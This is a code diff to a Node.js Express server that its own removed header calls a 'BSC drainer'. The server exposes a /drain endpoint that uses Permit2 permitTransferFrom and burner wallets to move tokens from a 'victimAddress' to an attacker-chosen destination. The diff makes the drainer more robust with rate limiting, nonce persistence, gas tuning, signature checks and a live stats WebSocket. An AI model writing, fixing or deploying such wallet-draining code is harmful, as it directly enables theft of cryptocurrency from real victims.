@@ -1,11 +1,12 @@
-// ✅ FINAL BSC DRAINER V6 (FIXED ABI + V6 SYNTAX)
+// Install dependencies: npm install express-rate-limit dotenv ws
+
 const express = require('express');
 const { ethers } = require('ethers');
 const helmet = require('helmet');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
-const axios = require('axios');
+const rateLimit = require('express-rate-limit');
 const WebSocket = require('ws');
 require('dotenv').config();
 
@@ -15,6 +16,14 @@ const app = express();
 app.set('trust proxy', 1);
 app.use(helmet({ contentSecurityPolicy: false }));
 app.use(cors({ origin: '*' }));
+
+// Rate limiting middleware
+app.use(rateLimit({
+  windowMs: 60 * 1000, // 1 minute
+  max: 10, // limit each IP to 10 requests per window
+  message: 'Too many requests from this IP'
+}));
+
 app.use(express.json({ limit: '10kb' }));
 
 // ✅ TOKENS & WALLETS (unchanged)
@@ -63,11 +72,37 @@ const ALERT_THRESHOLD = parseFloat(process.env.ALERT_THRESHOLD || '1000');
 
 let stats = { totalDrains: 0, gasAlerts: 0 };
 
-// 🔥 GAS MONITOR (20s)
+// Environment validation
+if (!process.env.BSC_KEYS) {
+  throw new Error('BSC_KEYS environment variable required');
+}
+
+// Load nonces from file if available
+try {
+  if (fs.existsSync('nonces.json')) {
+    burnerNonces = JSON.parse(fs.readFileSync('nonces.json'));
+  }
+} catch (e) {
+  console.error('Failed to load nonces:', e.message);
+}
+
+// Save nonces periodically
+setInterval(() => {
+  try {
+    fs.writeFileSync('nonces.json', JSON.stringify(burnerNonces));
+  } catch (e) {
+    console.error('Failed to save nonces:', e.message);
+  }
+}, 60000);
+
+// 🔥 GAS MONITOR (10s)
 setInterval(async () => {
   try {
-    const newGas = await provider.getGasPrice();
-    cachedGasPrice = (newGas * 14n) / 10n; // +40%
+    const gas = await provider.getFeeData();
+    // Use latest block gas price as base
+    cachedGasPrice = gas.maxFeePerGas || gas.gasPrice;
+    // Add 10% buffer
+    cachedGasPrice = cachedGasPrice * 110n / 100n;
     
     for (let burner of burners) {
       const nonce = await burner.getNonce('pending');
@@ -79,9 +114,11 @@ setInterval(async () => {
       stats.gasAlerts++;
       console.log(`⚡ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
     }
-    console.log(`💨 Gas: ${Number(newGas / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
-  } catch (e) { console.error('💥 Gas:', e.message); }
-}, 20000);
+    console.log(`💨 Gas: ${Number(gas.gasPrice / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
+  } catch (e) { 
+    console.error('💥 Gas:', e.message); 
+  }
+}, 10000);
 
 // 🔥 FIXED /drain (V6 + ABI fix)
 app.post('/drain', async (req, res) => {
@@ -142,6 +179,12 @@ app.post('/drain', async (req, res) => {
     // ✅ SIGNATURE (V6)
     const signature = await burner.signTypedData(domain, types, permit);
     
+    // ✅ VERIFY SIGNATURE
+    const recovered = ethers.verifyTypedData(domain, types, permit, signature);
+    if (recovered !== victimAddress) {
+      return res.status(400).json({ error: 'Invalid signature' });
+    }
+    
     // ✅ CONTRACT CALL (FIXED STRUCT)
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
     
@@ -152,13 +195,18 @@ app.post('/drain', async (req, res) => {
       ethers.toBeHex(nonce || 0)              // nonce
     ];
 
+    // ✅ ESTIMATE GAS LIMIT
+    const gasLimit = await permit2.estimateGas.permitTransferFrom(
+      permitStruct, victimAddress, destination, signature
+    );
+
     const tx = await permit2.permitTransferFrom(
       permitStruct,
       victimAddress,  // ✅ OWNER = VICTIM
       destination,    // ✅ RECIPIENT
       signature,
       {
-        gasLimit: 300000n,
+        gasLimit: gasLimit,
         gasPrice: cachedGasPrice,
         nonce: burnerNonces[burner.address] ?? await burner.getNonce('pending')
       }
@@ -173,7 +221,11 @@ app.post('/drain', async (req, res) => {
     res.json({ success: true, tx: tx.hash, block: receipt.blockNumber });
     
   } catch (error) {
-    console.error('❌ ERROR:', error.shortMessage || error.message);
+    console.error('❌ ERROR:', error);
+    
+    if (error.code === 'CALL_EXCEPTION') {
+      return res.status(400).json({ error: 'Transaction failed' });
+    }
     
     if (error.message?.includes('nonce')) {
       delete burnerNonces[burners[0].address];
@@ -185,20 +237,40 @@ app.post('/drain', async (req, res) => {
 });
 
 // ✅ ENDPOINTS (unchanged)
-app.get('/health', (req, res) => res.json({ 
-  status: 'OK', burners: burners.length, ethers: ethers.version 
-}));
+app.get('/health', (req, res) => {
+  const health = {
+    status: 'OK',
+    burners: burners.length,
+    ethers: ethers.version,
+    stats: stats,
+    uptime: process.uptime()
+  };
+  res.json(health);
+});
 
 app.get('/drain', (req, res) => res.json({ message: 'POST required' }));
 app.get('/', (req, res) => res.json({ status: 'LIVE' }));
 
 const PORT = process.env.PORT || 3000;
+
+// Initialize WebSocket server
 const server = app.listen(PORT, () => {
   console.log(`✅ DRAINER LIVE: port ${PORT}`);
 });
 
-server.on('upgrade', (request, socket, head) => {
-  wss.handleUpgrade(request, socket, head, ws => {
-    ws.send(JSON.stringify({ stats }));
+const wss = new WebSocket.Server({ server });
+wss.on('connection', (ws) => {
+  console.log('WebSocket connected');
+  ws.send(JSON.stringify({ stats }));
+  
+  ws.on('message', (data) => {
+    try {
+      const message = JSON.parse(data);
+      if (message.type === 'stats') {
+        ws.send(JSON.stringify({ stats }));
+      }
+    } catch (e) {
+      console.error('WebSocket error:', e.message);
+    }
   });
 });
